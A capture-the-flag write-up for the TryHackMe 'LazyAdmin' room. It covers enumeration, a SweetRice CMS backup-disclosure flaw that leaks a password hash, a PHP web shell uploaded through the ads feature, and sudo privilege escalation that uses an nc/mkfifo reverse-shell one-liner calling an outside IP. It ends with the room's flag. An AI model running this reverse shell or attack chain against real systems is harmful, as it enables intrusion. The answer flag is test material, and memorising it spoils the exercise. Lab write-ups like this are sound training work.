# LazyAdmin (Easy)

- Exploit the Server Apache Linux:

![Untitled](https://github.com/user-attachments/assets/080ebe79-5350-4cdd-9235-1edd9a5371e0)

- Scan ports and directory of the machine:

```bash
nmap -sV -vv -A -T4 <IP> -Pn
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

```bash
gobuster dir -u http://10.10.161.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xtxt -t64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.161.128/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 316] [--> http://10.10.161.128/content/]
/server-status        (Status: 403) [Size: 278]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
```

- We try go to /content

![Untitled 1](https://github.com/user-attachments/assets/95eb11a2-5063-45db-820b-3801462f60ac)

—> Now we have the name of website: “SweetRice”.

- We don’t have more any information about the credentials so we have to research to find the vuln and weakness of the website.
- We use `searchsploit` to research “SweetRice”

```bash
searchsploit SweetRice
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion          | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities       | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download        | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload          | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure              | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery     | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / P | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File U | php/webapps/14184.txt
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

—> A lot of Vuln to exploit so first we will notice the vuln “Backup Disclosure” because maybe in the backup file we can find the credential.

![Untitled 2](https://github.com/user-attachments/assets/e66dedea-dfde-4ac0-ab51-68b0792df7bb)

—> We try the concept: Access to file mysql backup and download from the directory /inc/mysql_backup but we need to access through the directory /content which we scan directory in the enumuration.

![Untitled 3](https://github.com/user-attachments/assets/c715994d-81d0-4d61-901c-9f098cab4b0d)

- Now we open the file mysql_backup and find some information the credential.

![Untitled 4](https://github.com/user-attachments/assets/9bfdd2ec-aa2e-4f2a-9b29-d448762ded79)

—> We got the username is “manager” and password is the hash value 

- Dehash password: “Password123”
- We switch the another vuln. We knew that there are cms SweetRice has the vuln CSRF (Cross-Side Request Forgery) and we can execute PHP code. Try it!

![Untitled 5](https://github.com/user-attachments/assets/fa60fc9f-23af-4c88-966e-47f94adb721d)

- We have found that we could access /as to access page log in SweetRice. Now we use the credential we found to login.

![Untitled 6](https://github.com/user-attachments/assets/662d4cf9-99a9-4d4e-8b53-106a71326b01)

![Untitled 7](https://github.com/user-attachments/assets/510f8c88-7a22-4664-8659-0f759e647538)

—> Success!!!

- We read the vuln database CSRF to exploit it. We will manipulate Ads section to add PHP code in Ads file and through CSRF vuln we can execute PHP code. Let do it!!!

![Untitled 8](https://github.com/user-attachments/assets/bd518c80-8ee3-4579-afb1-22436ce4e406)

- Now we will ad the web PHP shell available into the code <?php ?> and run file. After file PHP executed we access page in /inc/ads/Hacked.php and catch the listener through netcat to get initial access.

![Untitled 9](https://github.com/user-attachments/assets/c13a9a3f-f15b-42bb-9028-3b9282c44f70)

![Untitled 10](https://github.com/user-attachments/assets/e9fcee61-1759-45cd-a931-03fc5f4ea194)

—> We got it!!!

# Privilege Escalation:

- First we can try command  `sudo -l`  to check file can run sudo with no password.

```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

```bash
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

—> This file run perl script and first it will run /etc/copy.sh file. 

```bash
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 1234 >/tmp/f
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_Machine> 4444 >/tmp/f" > copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.75.150] from (UNKNOWN) [10.10.215.10] 51458
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
# exit
```

END!!!
